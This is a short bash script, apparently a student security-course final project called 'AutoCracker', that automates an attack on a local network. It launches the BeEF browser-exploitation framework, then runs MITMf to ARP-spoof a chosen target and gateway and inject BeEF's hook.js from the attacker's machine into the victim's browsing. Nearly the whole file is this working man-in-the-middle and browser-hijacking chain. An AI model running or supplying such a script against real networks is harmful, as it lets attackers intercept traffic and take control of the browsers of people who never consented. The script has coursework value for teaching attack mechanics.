echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/00000"
echo "000/  _  \  __ ___/  |_  ____   ________________    ____ |  | __ ___________ 0"
echo "00/  /_\  \|  |  \   __\/  _ \_/ ___\_  __ \____\00/ ___\|  |/ // __ \_  __ \0"
echo "0/    |    \  |  /|  |0(  ( ) )  \___|  |0\//____\\  \___|    <  \ ___/ | | \/0"
echo "0\____|__  /____/0|__|00\____/ \___  >__|00(______/\_____>__|_ \ \___> | |0000"
echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/00000"											
#working title:)/ ascii art title

echo "CS378 AutoCracker - Browser Hook and CSRFF Final Project"
echo "By Dillon Cuthrell, Anthony Nguyen, Midora DuBose"

echo "Enter you IP here"
read yours
echo "Enter your router's IP here"
read router
echo "Enter target IP here"
read target

if [[ -n yours && -n target  ]] ;
then
echo "Your IP is $yours, Router is $router, Target is $target"


echo "Staring BeEF ... "
cd /usr/share/beef-xss; ./beef > /root/Desktop/boutput.txt

#parse obutput.txt
r=Hook 
wait
cat /root/Desktop/boutput.txt | while read i
do 
if [ ! "${i/$r}" = "$i" ] ; then
#the second echo is our hook url
echo "$i"
fi 
done

xvar="http://$yours:3000/ui/panel"
xdg-open $xvar

#here we would pass our site/target to mitmf
echo "Starting MITMf ... "
mvar="mitmf --spoof --arp -i eth0 --gateway $router --target $target --inject --js-url http://$yours:3000/hook.js > /root/Desktop/moutput.txt"
echo $mvar
eval $mvar


fi


echo "autocracker done"
#do stuff
